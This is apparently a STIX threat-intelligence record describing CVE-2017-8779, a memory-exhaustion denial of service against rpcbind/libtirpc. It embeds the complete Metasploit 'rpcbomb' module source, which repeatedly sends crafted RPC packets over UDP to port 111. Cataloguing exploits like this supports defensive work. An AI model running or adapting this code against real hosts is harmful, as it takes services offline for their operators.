{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c88961cf-ac52-40d3-b27c-d612d02b71df",
    "created": "2024-08-14T16:24:51.812119Z",
    "modified": "2024-08-14T16:24:51.812123Z",
    "name": "RPC DoS targeting *nix rpcbind/libtirpc",
    "description": " This module exploits a vulnerability in certain versions of rpcbind, LIBTIRPC, and NTIRPC, allowing an attacker to trigger large (and never freed) memory allocations for XDR strings on the target. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/rpc/rpcbomb.rb",
            "external_id": "rpcbomb.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8779"
        },
        {
            "source_name": "reference",
            "url": "http://openwall.com/lists/oss-security/2017/05/03/12"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Dos\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::UDPScanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'RPC DoS targeting *nix rpcbind/libtirpc',\n      'Description' => %q{\n        This module exploits a vulnerability in certain versions of\n        rpcbind, LIBTIRPC, and NTIRPC, allowing an attacker to trigger\n        large (and never freed) memory allocations for XDR strings on\n        the target.\n      },\n      'Author'  =>\n        [\n          'guidovranken', # original code\n          'Pearce Barry <pearce_barry[at]rapid7.com>' # Metasploit module\n        ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        [ 'CVE', '2017-8779' ],\n        [ 'BID', '98325' ],\n        [ 'URL', 'http://openwall.com/lists/oss-security/2017/05/03/12' ]\n      ],\n      'Disclosure Date' => 'May 03 2017'))\n\n    register_options([\n      Opt::RPORT(111),\n      OptInt.new('ALLOCSIZE', [true, 'Number of bytes to allocate', 1000000]),\n      OptInt.new('COUNT', [false, \"Number of intervals to loop\", 1000000])\n    ])\n  end\n\n  def scan_host(ip)\n    pkt = [\n      0,        # xid\n      0,        # message type CALL\n      2,        # RPC version 2\n      100000,   # Program\n      4,        # Program version\n      9,        # Procedure\n      0,        # Credentials AUTH_NULL\n      0,        # Credentials length 0\n      0,        # Credentials AUTH_NULL\n      0,        # Credentials length 0\n      0,        # Program: 0\n      0,        # Ver\n      4,        # Proc\n      4,        # Argument length\n      datastore['ALLOCSIZE'] # Payload\n    ].pack('N*')\n\n    s = udp_socket(ip, datastore['RPORT'])\n    count = 0\n    while count < datastore['COUNT'] do\n      begin\n        s.send(pkt, 0)\n      rescue ::Errno::ENOBUFS, ::Rex::ConnectionError, ::Errno::ECONNREFUSED\n        vprint_error(\"Host #{ip} unreachable\")\n        break\n      end\n      count += 1\n    end\n\n    vprint_good(\"Completed #{count} loop(s) of allocating #{datastore['ALLOCSIZE']} bytes on host #{ip}:#{datastore['RPORT']}\")\n  end\nend\n"
}